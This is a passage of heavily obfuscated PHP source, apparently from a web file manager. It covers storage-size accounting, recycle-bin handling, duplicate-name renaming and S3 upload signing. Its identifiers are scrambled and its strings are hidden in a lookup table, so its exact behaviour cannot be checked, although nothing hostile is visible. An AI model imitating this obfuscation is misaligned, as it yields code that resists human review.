$this->field($±“‘–ÁŞ)->where($´î¬§ª)->select(); if (!$Î¯¿ÜÕ‡) { return; } $§Ï¦ê¬š[] = $¶Òìóæ; $§Ï¦ê¬š = array_to_keyvalue($§Ï¦ê¬š, $©‘ı¶[411]); foreach ($§Ï¦ê¬š as $†´ú™ìÃ => $éÎ¤ÍŠ) { $§Ï¦ê¬š[$†´ú™ìÃ][$©‘ı¶[2161]] = $§Ï¦ê¬š[$†´ú™ìÃ][$©‘ı¶[76]]; $§Ï¦ê¬š[$†´ú™ìÃ][$©‘ı¶[76]] = 0; } foreach ($Î¯¿ÜÕ‡ as $éÎ¤ÍŠ) { $ÑßË¬ıÈ = $éÎ¤ÍŠ[$©‘ı¶[441]] . $©‘ı¶[12]; if (!isset($§Ï¦ê¬š[$ÑßË¬ıÈ])) { continue; } if ($éÎ¤ÍŠ[$©‘ı¶[440]] == $§Ï¦ê¬š[$ÑßË¬ıÈ][$©‘ı¶[440]]) { $§Ï¦ê¬š[$ÑßË¬ıÈ][$©‘ı¶[76]] += $éÎ¤ÍŠ[$©‘ı¶[76]]; } } foreach ($§Ï¦ê¬š as $éÎ¤ÍŠ) { $ˆ¢š™­Ä = $this->parentLevelArray($éÎ¤ÍŠ[$©‘ı¶[520]]); foreach ($ˆ¢š™­Ä as $ÑßË¬ıÈ) { $ÑßË¬ıÈ = $ÑßË¬ıÈ . $©‘ı¶[12]; if (!isset($§Ï¦ê¬š[$ÑßË¬ıÈ])) { continue; } if ($éÎ¤ÍŠ[$©‘ı¶[440]] == $§Ï¦ê¬š[$ÑßË¬ıÈ][$©‘ı¶[440]]) { $§Ï¦ê¬š[$ÑßË¬ıÈ][$©‘ı¶[76]] += $éÎ¤ÍŠ[$©‘ı¶[76]]; } } } $ÇËåî£Ù = array(); foreach ($§Ï¦ê¬š as $éÎ¤ÍŠ) { if ($éÎ¤ÍŠ[$©‘ı¶[76]] == $éÎ¤ÍŠ[$©‘ı¶[2161]]) { continue; } $ÇËåî£Ù[] = array($©‘ı¶[411], $éÎ¤ÍŠ[$©‘ı¶[411]], $©‘ı¶[76], $éÎ¤ÍŠ[$©‘ı¶[76]]); } $this->saveAll($ÇËåî£Ù); } public function userSpaceReset($í‡™Ô Â = false) { $à¤÷ûøÍ =& $_SERVER[Ó¡Ÿ§‚]; $øÆÌ›Íˆ = $this->where(array($à¤÷ûøÍ[420] => self::TYPE_USER, $à¤÷ûøÍ[505] => $í‡™Ô Â, $à¤÷ûøÍ[419] => 0))->sum($à¤÷ûøÍ[76]); $øÆÌ›Íˆ = !$øÆÌ›Íˆ || $øÆÌ›Íˆ <= 0 ? 0 : $øÆÌ›Íˆ; Model($à¤÷ûøÍ[513])->userEdit($í‡™Ô Â, array($à¤÷ûøÍ[1843] => $øÆÌ›Íˆ)); } public function targetSpaceUpdate($ï¶Íñéş, $˜…·¶·‘) { $Ğäõ›î =& $_SERVER[Ó¡Ÿ§‚]; if (!$˜…·¶·‘) { return; } if (!in_array($ï¶Íñéş, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $şıÄªÍ = $this->targetSpaceSize($ï¶Íñéş, $˜…·¶·‘); if ($ï¶Íñéş == self::TYPE_USER) { Model($Ğäõ›î[513])->userEdit($˜…·¶·‘, array($Ğäõ›î[1843] => $şıÄªÍ)); } else { if ($ï¶Íñéş == self::TYPE_GROUP) { Model($Ğäõ›î[521])->groupEdit($˜…·¶·‘, array($Ğäõ›î[1843] => $şıÄªÍ)); } } } public function targetSpaceSize($ú¥ÊÈõ, $ŞØˆ°Ñ«) { $È¹Â“¶É =& $_SERVER[Ó¡Ÿ§‚]; $ÓŸÊ©¨ = 0; $¿çå´» = $this->targetSourceRoot($ú¥ÊÈõ, $ŞØˆ°Ñ«, !0); foreach ($¿çå´» as $ïœÜ…Ş) { if (!$ïœÜ…Ş) { continue; } $ÓŸÊ©¨ += floatval($ïœÜ…Ş[$È¹Â“¶É[76]]); $Úµ³¤ = array($È¹Â“¶É[589] => array($È¹Â“¶É[549], $È¹Â“¶É[530] . $ïœÜ…Ş[$È¹Â“¶É[411]] . $È¹Â“¶É[550])); $©ˆÆƒÍ = Model($È¹Â“¶É[438])->field($È¹Â“¶É[426])->where($Úµ³¤)->select(); $©ˆÆƒÍ = array_to_keyvalue($©ˆÆƒÍ, $È¹Â“¶É[12], $È¹Â“¶É[411]); $©ˆÆƒÍ = array_unique(array_filter($©ˆÆƒÍ)); if ($©ˆÆƒÍ) { $Úµ³¤ = array($È¹Â“¶É[426] => array($È¹Â“¶É[427], $©ˆÆƒÍ)); $ÓŸÊ©¨ += floatval($this->where($Úµ³¤)->sum($È¹Â“¶É[76])); } } $ÓŸÊ©¨ = !$ÓŸÊ©¨ || $ÓŸÊ©¨ <= 0 ? 0 : $ÓŸÊ©¨; return $ÓŸÊ©¨; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($†‰ Ã³¬) { return $this->fileTypeProfile($†‰ Ã³¬, SourceModel::TYPE_USER); } public function groupFileTypeProfile($óÒà³•”) { return $this->fileTypeProfile($óÒà³•”, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¼¶Šìå, $İêé¬°Ò) { $üèçÆú‰ =& $_SERVER[Ó¡Ÿ§‚]; $¥©Ëö®Ó = $üèçÆú‰[2162] . $¼¶Šìå . $üèçÆú‰[11] . $İêé¬°Ò; $¢Õë¢¡ = Cache::get($¥©Ëö®Ó); if ($¢Õë¢¡) { return $¢Õë¢¡; } $°•úãÚÌ = array($üèçÆú‰[583] => 0); if ($¼¶Šìå != !1) { $°•úãÚÌ[$üèçÆú‰[505]] = $¼¶Šìå; $°•úãÚÌ[$üèçÆú‰[420]] = $İêé¬°Ò; } $¬Ş˜ÜÖ³ = array(); $¬Ş˜ÜÖ³[$üèçÆú‰[2163]] = array($üèçÆú‰[2164] => LNG($üèçÆú‰[2163]), $üèçÆú‰[2165] => $this->where($°•úãÚÌ)->count(), $üèçÆú‰[554] => $this->where($°•úãÚÌ)->sum($üèçÆú‰[76])); $ŠÏ‡ğÌ™ = KodIO::fileTypeList(); foreach ($ŠÏ‡ğÌ™ as $§ì‰–Ôğ => $‘¤®‰©Â) { $°•úãÚÌ[$üèçÆú‰[421]] = $this->fileTypeWhere($§ì‰–Ôğ); $¬Ş˜ÜÖ³[$§ì‰–Ôğ] = array($üèçÆú‰[2164] => $‘¤®‰©Â[$üèçÆú‰[32]], $üèçÆú‰[2165] => $this->where($°•úãÚÌ)->count(), $üèçÆú‰[554] => $this->where($°•úãÚÌ)->sum($üèçÆú‰[76])); } Cache::set($¥©Ëö®Ó, $¬Ş˜ÜÖ³, 1200); return $¬Ş˜ÜÖ³; } public function fileNameExist($§Ì¦ÏÅ, $ùÏ’úıŒ) { $ĞÖøıò‹ =& $_SERVER[Ó¡Ÿ§‚]; $Ë×°ï×ú = $this->where(array($ĞÖøıò‹[441] => $§Ì¦ÏÅ, $ĞÖøıò‹[32] => $ùÏ’úıŒ, $ĞÖøıò‹[440] => 0))->find(); return is_array($Ë×°ï×ú) ? $Ë×°ï×ú[$ĞÖøıò‹[411]] : !1; } public function childList($¶®çÛÒÊ) { $ÌïØ…—Í =& $_SERVER[Ó¡Ÿ§‚]; $´Š«ŞÛñ = $ÌïØ…—Í[2140] . $¶®çÛÒÊ; if (isset(self::$cacheChildList[$´Š«ŞÛñ])) { return self::$cacheChildList[$´Š«ŞÛñ]; } $¤¿äÀæ¢ = array($ÌïØ…—Í[441] => intval($¶®çÛÒÊ), $ÌïØ…—Í[440] => 0); $æ•’ÖŠ = $this->where($¤¿äÀæ¢)->select(); $æ•’ÖŠ = $æ•’ÖŠ ? $æ•’ÖŠ : array(); self::$cacheChildList[$´Š«ŞÛñ] = $æ•’ÖŠ; foreach ($æ•’ÖŠ as $ø†â¡Ù“) { $´Š«ŞÛñ = $ÌïØ…—Í[469] . $ø†â¡Ù“[$ÌïØ…—Í[411]]; self::$cacheSourceInfo[$´Š«ŞÛñ] = $ø†â¡Ù“; } return $æ•’ÖŠ; } public function fileNameAuto($„ôÛïÑö, $šÉ…±Îˆ, $¿Ş±á–ó = REPEAT_RENAME, $µĞö˜·å = false) { $ÂÂÓø¯Í =& $_SERVER[Ó¡Ÿ§‚]; $»÷ËÕßú = get_path_ext($šÉ…±Îˆ); $¿Œ¶­§‡ = $»÷ËÕßú ? basename($šÉ…±Îˆ, $ÂÂÓø¯Í[10] . $»÷ËÕßú) . $ÂÂÓø¯Í[2166] . $»÷ËÕßú : $šÉ…±Îˆ . $ÂÂÓø¯Í[384]; $ßŞ„ëâ² = array($ÂÂÓø¯Í[441] => $„ôÛïÑö, $ÂÂÓø¯Í[440] => 0, $ÂÂÓø¯Í[32] => array($ÂÂÓø¯Í[383], $¿Œ¶­§‡)); $Û˜ã³± = $this->field($ÂÂÓø¯Í[32])->where($ßŞ„ëâ²)->select(); $Ÿ‹¤Ú¯µ = array_to_keyvalue($Û˜ã³±, $ÂÂÓø¯Í[12], $ÂÂÓø¯Í[32]); return $this->fileNameAutoGet($Ÿ‹¤Ú¯µ, $šÉ…±Îˆ, $¿Ş±á–ó, $µĞö˜·å); } public function fileNameAutoGet($Á¡æ‹ÁÎ, $È¸–‘•‰, $¼èçŠ÷ù, $Ø…·¹ÈÕ) { $Ê‘Ü‰Ÿß =& $_SERVER[Ó¡Ÿ§‚]; if ($¼èçŠ÷ù == REPEAT_REPLACE || !$Á¡æ‹ÁÎ || !in_array_not_case($È¸–‘•‰, $Á¡æ‹ÁÎ) || $Ø…·¹ÈÕ && $¼èçŠ÷ù != REPEAT_RENAME_FOLDER) { return $È¸–‘•‰; } if ($¼èçŠ÷ù == REPEAT_SKIP) { return !1; } $øüñøÑà = $Ê‘Ü‰Ÿß[10] . get_path_ext($È¸–‘•‰); $øüñøÑà = $øüñøÑà == $Ê‘Ü‰Ÿß[10] || $Ø…·¹ÈÕ ? $Ê‘Ü‰Ÿß[12] : $øüñøÑà; for ($ÏÃ›ù¶– = 1; $ÏÃ›ù¶– <= count($Á¡æ‹ÁÎ) + 1; $ÏÃ›ù¶–++) { $‰Ó¥—ì‹ = substr($È¸–‘•‰, 0, strlen($È¸–‘•‰) - strlen($øüñøÑà)); $¨²…“¡ğ = $‰Ó¥—ì‹ . "\x28{$ÏÃ›ù¶–}\x29{$øüñøÑà}"; if (!in_array_not_case($¨²…“¡ğ, $Á¡æ‹ÁÎ)) { return $¨²…“¡ğ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\143\x65\137\x72\x65\143\x79\143\154\x65"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\124\151\155\145", "\164\x69\155\145", "\151\156\163\x65\x72\164", "\x66\x75\156\143\164\151\157\156")); public function listData($’ô·’ì¶ = false) { $²‘ÎŸÇ =& $_SERVER[Ó¡Ÿ§‚]; $’ô·’ì¶ = $’ô·’ì¶ ? $’ô·’ì¶ : USER_ID; $Ã£ÎÍ×÷ = $this->where(array($²‘ÎŸÇ[1656] => $’ô·’ì¶))->select(); return array_to_keyvalue($Ã£ÎÍ×÷, $²‘ÎŸÇ[12], $²‘ÎŸÇ[411]); } public function moveToRecycle($š³’ğË‰) { $‡Ò÷¼ØÈ =& $_SERVER[Ó¡Ÿ§‚]; $ŒŸÛÜ  = Model($‡Ò÷¼ØÈ[1338]); $™•ëÑû³ = $ŒŸÛÜ ->sourceInfo($š³’ğË‰); if (!$™•ëÑû³ || $™•ëÑû³[$‡Ò÷¼ØÈ[440]] == $‡Ò÷¼ØÈ[88]) { return; } $ùˆàéİõ = array($‡Ò÷¼ØÈ[426] => $š³’ğË‰, $‡Ò÷¼ØÈ[1656] => USER_ID, $‡Ò÷¼ØÈ[585] => $™•ëÑû³[$‡Ò÷¼ØÈ[420]], $‡Ò÷¼ØÈ[586] => $™•ëÑû³[$‡Ò÷¼ØÈ[505]], $‡Ò÷¼ØÈ[589] => $™•ëÑû³[$‡Ò÷¼ØÈ[520]]); $this->add($ùˆàéİõ); $this->recycleMove($š³’ğË‰, 1); if ($™•ëÑû³[$‡Ò÷¼ØÈ[419]] == $‡Ò÷¼ØÈ[88]) { $æœïåõÚ = array($‡Ò÷¼ØÈ[589] => array($‡Ò÷¼ØÈ[549], $™•ëÑû³[$‡Ò÷¼ØÈ[520]] . $š³’ğË‰ . $‡Ò÷¼ØÈ[550])); $ŒŸÛÜ ->where($æœïåõÚ)->setField($‡Ò÷¼ØÈ[440], 1); } } public function clear() { $this->remove(!1); } public function remove($¸Ä¨²ğ = false, $Ò÷¹¥§© = false) { $Õş ¦²¯ =& $_SERVER[Ó¡Ÿ§‚]; $Ò÷¹¥§© = $Ò÷¹¥§© ? $Ò÷¹¥§© : USER_ID; $¨ñÁ¤¦Ş = Model($Õş ¦²¯[1338]); $üğ´›¤ø = $this->listData($Ò÷¹¥§©); $¸Ä¨²ğ = $¸Ä¨²ğ === !1 ? !1 : $¸Ä¨²ğ; $ê¹»è´Š = array(); foreach ($üğ´›¤ø as $Áœœû€) { if ($¸Ä¨²ğ != !1 && !in_array($Áœœû€, $¸Ä¨²ğ)) { continue; } $óåé›à• = $¨ñÁ¤¦Ş->sourceInfo($Áœœû€); $¨ñÁ¤¦Ş->remove($Áœœû€, !1); $›øƒ¥ì¹ = $óåé›à•[$Õş ¦²¯[420]] . $Õş ¦²¯[11] . $óåé›à•[$Õş ¦²¯[505]]; $ê¹»è´Š[$›øƒ¥ì¹] = array($Õş ¦²¯[585] => $óåé›à•[$Õş ¦²¯[420]], $Õş ¦²¯[505] => $óåé›à•[$Õş ¦²¯[505]]); $this->where(array($Õş ¦²¯[411] => $Áœœû€))->delete(); } foreach ($ê¹»è´Š as $±‚ĞäÖÂ) { $¨ñÁ¤¦Ş->targetSpaceUpdate($±‚ĞäÖÂ[$Õş ¦²¯[420]], $±‚ĞäÖÂ[$Õş ¦²¯[505]]); } } public function restore($ø’¥ÈÁÚ = false) { $áÚ• òÛ = $this->listData(); $this->_restoreSource($áÚ• òÛ, $ø’¥ÈÁÚ); } public function removeUserAll($‡ùı•Ê) { $this->remove(!1, $‡ùı•Ê); } private function _restoreSource($ä¼¢Ÿş, $ÇÎ¶ˆş¤) { $ĞÄÎñ™‘ =& $_SERVER[Ó¡Ÿ§‚]; $éö×ıúİ = Model($ĞÄÎñ™‘[1338]); $ÇÎ¶ˆş¤ = $ÇÎ¶ˆş¤ == !1 ? !1 : $ÇÎ¶ˆş¤; if (!$ä¼¢Ÿş) { return !0; } $»“Óõ€™ = array(); foreach ($ä¼¢Ÿş as $šàüôşø) { if ($ÇÎ¶ˆş¤ != !1 && !in_array($šàüôşø, $ÇÎ¶ˆş¤)) { continue; } $¨´×¾¼Å = $éö×ıúİ->sourceInfo($šàüôşø); $ˆÅÇŒÔ¥ = $éö×ıúİ->sourceInfo($¨´×¾¼Å[$ĞÄÎñ™‘[441]]); if ($ˆÅÇŒÔ¥[$ĞÄÎñ™‘[440]] == $ĞÄÎñ™‘[88]) { continue; } $éö×ıúİ->lockMoveStart($šàüôşø); $this->recycleMove($šàüôşø, 0); if ($¨´×¾¼Å[$ĞÄÎñ™‘[419]] == $ĞÄÎñ™‘[88]) { $•ñ¸Ô‰š = array($ĞÄÎñ™‘[589] => array($ĞÄÎñ™‘[549], $¨´×¾¼Å[$ĞÄÎñ™‘[520]] . $šàüôşø . $ĞÄÎñ™‘[550])); $éö×ıúİ->where($•ñ¸Ô‰š)->setField($ĞÄÎñ™‘[440], 0); $this->restoreFolderChildren($šàüôşø, $ä¼¢Ÿş); } $this->where(array($ĞÄÎñ™‘[411] => $šàüôşø))->delete(); $éö×ıúİ->folderSizeReset($¨´×¾¼Å[$ĞÄÎñ™‘[441]]); $»“Óõ€™[] = $¨´×¾¼Å[$ĞÄÎñ™‘[441]]; if ($¨´×¾¼Å[$ĞÄÎñ™‘[419]] == $ĞÄÎñ™‘[88]) { $»“Óõ€™[] = $šàüôşø; } $éö×ıúİ->lockMoveEnd($šàüôşø); } $éö×ıúİ->updateModifyTime($»“Óõ€™); } private function restoreFolderChildren($ß¥è•Î´, $ş€˜Ç×) { $ÑÍˆŞ»‚ =& $_SERVER[Ó¡Ÿ§‚]; $îå”â = Model($ÑÍˆŞ»‚[1338]); $õ÷“ŠŸ = array($ÑÍˆŞ»‚[411] => array($ÑÍˆŞ»‚[7], array())); foreach ($ş€˜Ç× as $“‡÷ıÙÜ) { if ($“‡÷ıÙÜ == $ß¥è•Î´) { continue; } if (!$îå”â->isParentOf($ß¥è•Î´, $“‡÷ıÙÜ)) { continue; } $•åÌ¦ØÄ = $îå”â->sourceInfo($“‡÷ıÙÜ); if ($•åÌ¦ØÄ[$ÑÍˆŞ»‚[419]] == $ÑÍˆŞ»‚[88]) { $õ÷“ŠŸ[] = array($ÑÍˆŞ»‚[589] => array($ÑÍˆŞ»‚[549], $•åÌ¦ØÄ[$ÑÍˆŞ»‚[520]] . $“‡÷ıÙÜ . $ÑÍˆŞ»‚[550])); } else { $õ÷“ŠŸ[$ÑÍˆŞ»‚[411]][1][] = $“‡÷ıÙÜ; } } if (!$õ÷“ŠŸ[$ÑÍˆŞ»‚[411]][1]) { unset($õ÷“ŠŸ[$ÑÍˆŞ»‚[411]]); } if (!$õ÷“ŠŸ) { return; } $õ÷“ŠŸ[$ÑÍˆŞ»‚[411]][1] = array_unique($õ÷“ŠŸ[$ÑÍˆŞ»‚[411]][1]); $õ÷“ŠŸ[$ÑÍˆŞ»‚[999]] = $ÑÍˆŞ»‚[1952]; $îå”â->where($õ÷“ŠŸ)->setField($ÑÍˆŞ»‚[440], 1); } private function recycleMove($Ã©ƒå‚£, $ö¸ı«èË = 1) { $É¡ şÕš =& $_SERVER[Ó¡Ÿ§‚]; $”Ú©‹¥ø = Model($É¡ şÕš[1338]); $…ğ×ø‹‘ = Model($É¡ şÕš[2167]); $©ÀÄ„‚ = array($É¡ şÕš[411] => $Ã©ƒå‚£); if ($ö¸ı«èË) { $”Ú©‹¥ø->where($©ÀÄ„‚)->setField($É¡ şÕš[440], 1); $…ğ×ø‹‘->eventRecycle($Ã©ƒå‚£, $É¡ şÕš[2168]); } else { $›ÔÀíş› = $”Ú©‹¥ø->where($©ÀÄ„‚)->find(); $Ìë¹ŒÓÃ = $›ÔÀíş›[$É¡ şÕš[419]] == $É¡ şÕš[88]; $Ä¿–ñÙœ = $”Ú©‹¥ø->fileNameAuto($›ÔÀíş›[$É¡ şÕš[441]], $›ÔÀíş›[$É¡ şÕš[32]], REPEAT_RENAME_FOLDER, $Ìë¹ŒÓÃ); if ($Ä¿–ñÙœ != $›ÔÀíş›[$É¡ şÕš[32]]) { $”Ú©‹¥ø->rename($Ã©ƒå‚£, $Ä¿–ñÙœ); } $”Ú©‹¥ø->where($©ÀÄ„‚)->setField($É¡ şÕš[440], 0); $…ğ×ø‹‘->eventRecycle($Ã©ƒå‚£, $É¡ şÕš[2169]); } } } goto fëƒ†’‡Âº; Eï†³ÌŒà: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ÎÖƒ’™¡) { parent::__construct($ÎÖƒ’™¡); } public function uploadFormData($²à¹ëæÁ, $ãØŒÅ“• = 3600) { $³ªş˜ß =& $_SERVER[Ó¡Ÿ§‚]; $Ù‘»Öñ = $³ªş˜ß[199]; $ºÙØíïË = $³ªş˜ß[1357]; $ƒ¤ä–ÃÅ = $³ªş˜ß[62]; $åê„„¡ = gmdate($³ªş˜ß[1358]); $âµ°Óà¸ = gmdate($³ªş˜ß[749]); $”û³˜‰¡ = $³ªş˜ß[1359]; $±¬°ÁœÍ = $ãØŒÅ“• . $³ªş˜ß[12]; $ùôÉûó‚ = $³ªş˜ß[1321]; $ÛØó€ˆ¨ = array($this->accessKey, $âµ°Óà¸, $this->region, $ƒ¤ä–ÃÅ, $”û³˜‰¡); $Ù¥ø†¸€ = implode($³ªş˜ß[8], $ÛØó€ˆ¨); $ó››áëú = array($³ªş˜ß[1323] => gmdate($³ªş˜ß[1322], strtotime($³ªş˜ß[1360])), $³ªş˜ß[1324] => array(array($³ªş˜ß[1326] => $this->bucket), array($³ªş˜ß[1325] => $Ù‘»Öñ), array($³ªş˜ß[1327], $³ªş˜ß[1328], $³ªş˜ß[12]), array($³ªş˜ß[1327], $³ªş˜ß[1361], $³ªş˜ß[12]), array($³ªş˜ß[1327], $³ªş˜ß[1362], $³ªş˜ß[12]), array($³ªş˜ß[1329] => $ùôÉûó‚), array($³ªş˜ß[1363] => $Ù¥ø†¸€), array($³ªş˜ß[1364] => $ºÙØíïË), array($³ªş˜ß[1365] => $åê„„¡), array($³ªş˜ß[1366] => $±¬°ÁœÍ))); $ÚÚıÇ˜† = base64_encode(json_encode($ó››áëú)); $ÕÀ®„¢ƒ = hash_hmac($³ªş˜ß[1367], $âµ°Óà¸, $³ªş˜ß[1368] . $this->secret, !0); $şéÒËş = hash_hmac($³ªş˜ß[1367], $this->region, $ÕÀ®„¢ƒ, !0); $ıĞ£Êè¥ = hash_hmac($³ªş˜ß[1367], $ƒ¤ä–ÃÅ, $şéÒËş, !0); $¬’æ²¼÷ = hash_hmac($³ªş˜ß[1367], $”û³˜‰¡, $ıĞ£Êè¥, !0); $Õ¦Ğ–¯¾ = hash_hmac($³ªş˜ß[1367], $ÚÚıÇ˜†, $¬’æ²¼÷); $¢øÕñ¢Ö = array($³ªş˜ß[215] => $³ªş˜ß[12], $³ªş˜ß[1369] => $³ªş˜ß[12], $³ªş˜ß[1325] => $Ù‘»Öñ, $³ªş˜ß[1329] => $ùôÉûó‚, $³ªş˜ß[1333] => $ÚÚıÇ˜†, $³ªş˜ß[1370] => $Ù¥ø†¸€, $³ªş˜ß[1371] => $ºÙØíïË, $³ªş˜ß[1372] => $åê„„¡, $³ªş˜ß[1373] => $±¬°ÁœÍ, $³ªş˜ß[1374] => $Õ¦Ğ–¯¾, $³ªş˜ß[182] => $this->getHost()); return $¢øÕñ¢Ö; } public function multiUploadFormData($ÍöÓ½íç, $´şÍ¾õÚ = 3600) { $öûÔáŠ· =& $_SERVER[Ó¡Ÿ§‚]; $œ…œ¹Ò» = gmdate($öûÔáŠ·[1453]); $–¯ÆïÀ¡ = array(); $ğûÚÑµ… = $this->client->getUploadId($this->bucket, $ÍöÓ½íç, $–¯ÆïÀ¡); if (!$ğûÚÑµ…) { return !1; } return array($öûÔáŠ·[223] => $ğûÚÑµ…, $öûÔáŠ·[182] => $this->getHost() . $öûÔáŠ·[8] . $this->pathEncode($ÍöÓ½íç), $öûÔáŠ·[224] => $œ…œ¹Ò», $öûÔáŠ·[94] => $ÍöÓ½íç); } public function multiUploadAuthData($·…ôÕ ƒ, $©ğøë¢ó = array()) { $à¥¯¦øò =& $_SERVER[Ó¡Ÿ§‚]; $¡ÈãÔÈ = isset($©ğøë¢ó[$à¥¯¦øò[174]]) ? $©ğøë¢ó[$à¥¯¦øò[174]] : $à¥¯¦øò[12]; $øŸ˜ĞÀ‡ = $©ğøë¢ó[$à¥¯¦øò[94]]; unset($©ğøë¢ó[$à¥¯¦øò[94]]); if (isset($©ğøë¢ó[$à¥¯¦øò[225]])) { return $this->listUploadParts($øŸ˜ĞÀ‡, $©ğøë¢ó); } $’êæ°÷Ş = array(); if (isset($©ğøë¢ó[$à¥¯¦øò[1454]])) { $’êæ°÷Ş[$à¥¯¦øò[1455]] = $©ğøë¢ó[$à¥¯¦øò[1454]]; } $û‚ûüãñ = explode($à¥¯¦øò[184], $this->getHost()); $¯ºÚÈî = array($à¥¯¦øò[1456] => $û‚ûüãñ[1], $à¥¯¦øò[1457] => $à¥¯¦øò[12], $à¥¯¦øò[215] => $à¥¯¦øò[120], $à¥¯¦øò[1369] => $©ğøë¢ó[$à¥¯¦øò[76]]); $šÉ§ÁÌ = $à¥¯¦øò[228]; $¿¹Üìƒ³ = $à¥¯¦øò[8] . $this->pathEncode($øŸ˜ĞÀ‡) . $¡ÈãÔÈ; $²ş¤ôÔ = $this->client->__getSignatureV4($’êæ°÷Ş, $¯ºÚÈî, $šÉ§ÁÌ, $¿¹Üìƒ³); if (strpos($¡ÈãÔÈ, $à¥¯¦øò[227]) === 0) { if (isset($’êæ°÷Ş[$à¥¯¦øò[1455]])) { $ÏÇÜÕı = $’êæ°÷Ş[$à¥¯¦øò[1455]]; } else { if (isset($²ş¤ôÔ[$à¥¯¦øò[1455]])) { $ÏÇÜÕı = $²ş¤ôÔ[$à¥¯¦øò[1455]]; } else { $ÏÇÜÕı = hash($à¥¯¦øò[1367], $à¥¯¦øò[12]); } } return array($à¥¯¦øò[234] => $²ş¤ôÔ[$à¥¯¦øò[234]], $à¥¯¦øò[1455] => $ÏÇÜÕı, $à¥¯¦øò[224] => $²ş¤ôÔ[$à¥¯¦øò[1458]]); } return $²ş¤ôÔ[$à¥¯¦øò[234]]; } public function listUploadParts($÷ºËƒš†, $ÉçÉË™§ = array()) { $¼Î¾— ä =& $_SERVER[Ó¡Ÿ§‚]; $Âı´í¥ê = str_replace($¼Î¾— ä[235], $¼Î¾— ä[12], $ÉçÉË™§[$¼Î¾— ä[174]]); $”’ÜÎ½ı = $this->client->listParts($this->bucket, $÷ºËƒš†, $Âı´í¥ê); if (!$”’ÜÎ½ı) { return !1; } $ªÅ£ş± = $¼Î¾— ä[1459]; foreach ($”’ÜÎ½ı as $ËÁÕ©Á¾) { $ªÅ£ş± .= $¼Î¾— ä[1460] . "\x3c\x50\141\x72\x74\x4e\x75\155\142\145\162\76{$ËÁÕ©Á¾[$¼Î¾— ä[1414]]}\x3c\57\120\x61\x72\164\116\165\x6d\142\x65\x72\76\xa" . "\x3c\105\x54\141\147\76{$ËÁÕ©Á¾[$¼Î¾— ä[1415]]}\74\57\x45\x54\x61\147\x3e\12" . $¼Î¾— ä[1461]; } $ªÅ£ş± .= $¼Î¾— ä[1462]; $Ãí´È”• = array(); $æ•÷Ä¸ = explode($¼Î¾— ä[184], $this->getHost()); $şó’ô³ = array($¼Î¾— ä[1456] => $æ•÷Ä¸[1], $¼Î¾— ä[215] => $¼Î¾— ä[120], $¼Î¾— ä[1369] => strlen($ªÅ£ş±)); $›±äÅÎ¼ = $¼Î¾— ä[226]; $ïâŸ‚ïù = $¼Î¾— ä[8] . $this->pathEncode($÷ºËƒš†) . $ÉçÉË™§[$¼Î¾— ä[174]]; $Í­î§‡ = $this->client->__getSignatureV4($Ãí´È”•, $şó’ô³, $›±äÅÎ¼, $ïâŸ‚ïù, $ªÅ£ş±); return array($¼Î¾— ä[234] => $Í­î§‡[$¼Î¾— ä[234]], $¼Î¾— ä[224] => $Í­î§‡[$¼Î¾— ä[1458]], $¼Î¾— ä[236] => $”’ÜÎ½ı, $¼Î¾— ä[1455] => $Í­î§‡[$¼Î¾— ä[1455]]); } public function link($âîì—¹­, $¬¾¸Ÿæ = array()) { return parent::link($âîì—¹­, $¬¾¸Ÿæ); } public function fileOut($÷Ù¿“ò, $ƒíêœúˆ = false, $„ƒš¥šÂ = false, $œÜé›•† = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ó¡Ÿ§‚][1463])) { return parent::fileOutServer($÷Ù¿“ò, $ƒíêœúˆ, $„ƒš¥šÂ, $œÜé›•†); } parent::fileOut($÷Ù¿“ò, $ƒíêœúˆ, $„ƒš¥šÂ, $œÜé›•†); } public function fileOutImage($ çªŞàâ, $ø…Ÿé‰ = 250) { if (strstr($this->endpoint, $_SERVER[Ó¡Ÿ§‚][1463])) { return parent::fileOutImageServer($ çªŞàâ, $ø…Ÿé‰); } parent::fileOutImage($ çªŞàâ, $ø…Ÿé‰); } public function fileOutLink($†Ï‘‚¹é) { $ç›…¥·  =& $_SERVER[Ó¡Ÿ§‚]; if (substr($†Ï‘‚¹é, 0, 7) == $ç›…¥· [1336]) { $†Ï‘‚¹é = $ç›…¥· [1337] . substr($†Ï‘‚¹é, 7); } header($ç›…¥· [161] . $†Ï‘‚¹é); die; } public function getHost() { $Ÿú½Š®• =& $_SERVER[Ó¡Ÿ§‚]; $ÌœŒ£¤ì = str_rtrim(parent::getHost(), $Ÿú½Š®•[8] . $this->bucket); $ÌœŒ£¤ì = explode($Ÿú½Š®•[184], $ÌœŒ£¤ì); return $ÌœŒ£¤ì[0] . $Ÿú½Š®•[184] . $this->bucket . $Ÿú½Š®•[10] . $ÌœŒ£¤ì[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($úÁ”Ÿô¡, $²Ó²ÊçÍ = 0) { parent::__construct(); $this->source = $úÁ”Ÿô¡; $this->sourceSize = $²Ó²ÊçÍ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($µàÑËˆ = false) { return $this->sourceSize; } public function getContent($¦ë«ù‹ = false) { return $this->fileSubstr($¦ë«ù‹, 0, $this->sourceSize); } public function fileSubstr($ ¬Öè = false, $½¦âñÓ‡ = 0, $ßôá¯ª¬ = 0) { if (!$ßôá¯ª¬) { $ßôá¯ª¬ = $this->sourceSize; } $×…ûô¨Æ = $this->sourceSize - $½¦âñÓ‡; if ($ßôá¯ª¬ >= $×…ûô¨Æ) { $ßôá¯ª¬ = $×…ûô¨Æ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $½¦âñÓ‡, $ßôá¯ª¬); } if ($this->sourceType == self::TYPE_FILE) { if ($ßôá¯ª¬ <= 0) { return $_SERVER[Ó¡Ÿ§‚][12]; } $ù¬¿Ùœ½ = ftell($this->source); fseek_64($this->source, $ù¬¿Ùœ½ + $½¦âñÓ‡); $Ê÷š£ë£ = @fread($this->source, $ßôá¯ª¬); fseek_64($this->source, $ù¬¿Ùœ½); 